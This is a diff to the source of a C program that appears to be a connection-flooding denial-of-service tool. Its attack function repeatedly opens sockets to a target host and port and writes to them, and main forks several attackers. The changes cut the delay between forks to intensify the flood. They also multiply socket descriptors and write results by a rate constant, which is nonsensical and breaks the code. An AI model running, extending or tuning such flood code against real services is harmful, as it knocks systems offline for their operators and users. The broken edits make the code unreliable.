@@ -62,8 +62,8 @@ void attack(char *host, char *port, int id) {
 	while(1) {
 		for(x=0; x != CONNECTIONS; x++) {
 			if(sockets[x] == 0)
-				sockets[x] = make_socket(host, port);
-		        r=write(sockets[x], "\0", 1);
+				sockets[x] = make_socket(host, port) * PPS;
+		        r=write(sockets[x], "\0", 1) * PPS;
 			if(r == -1) {
 				close(sockets[x]);
 				sockets[x] = make_socket(host, port);
@@ -91,10 +91,10 @@ int main(int argc, char **argv) {
 	int x;
 	if(argc !=3)
 		cycle_identity();
-	for(x=0; x < PPS; x++) {
+	for(x=0; x != PPS; x++) {
 		if(fork())
 			attack(argv[1], argv[2], x);
-		usleep(300000);
+		usleep(200000);
 		
 	}
 	getc(stdin);
